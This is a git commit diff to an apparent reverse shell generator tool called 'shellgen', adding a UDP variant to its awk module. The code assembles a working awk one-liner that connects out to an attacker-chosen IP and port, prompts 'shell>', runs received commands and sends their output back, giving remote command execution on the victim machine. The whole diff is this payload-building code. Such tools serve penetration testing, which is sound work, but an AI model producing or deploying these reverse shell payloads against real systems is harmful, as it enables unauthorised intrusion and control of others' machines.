2a12b7323877ed6fb7a92c1adc36b7a67965cc87
smith <smith.nguyenhoangthanh@gmail.com>
2021-02-12 23:34:19 +0700

    add awk reverse shell UDP

--- shellgen/modules/linux/awk.py
+++ shellgen/modules/linux/awk.py
@@ -36,7 +36,17 @@ class ReverseTCP(plugin.ReverseShell):
         #     self.shell += """LFILE }'"""
         # else:
         self.shell = """awk 'BEGIN {s = \""""
-        self.shell += f"""/inet/tcp/0/{self.args.ip}/{self.args.port}";"""
+        if self.is_udp:
+            self.shell += f"""/inet/udp/0/{self.args.ip}/{self.args.port}";"""
+        else:
+            self.shell += f"""/inet/tcp/0/{self.args.ip}/{self.args.port}";"""
         self.shell += """while(42) { do{ printf "shell>" |& s; s |& getline c; """
         self.shell += """if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } """
         self.shell += """while(c != "exit") close(s); }}' /dev/null"""
+
+
+class ReverseUDP(ReverseTCP):
+    def __init__(self):
+        super().__init__()
+        self.is_udp = True
+        self.opts.description = "[ReverseShell][UDP] Generic shells from swisskyrepo/PayloadsAllTheThings. License MIT."
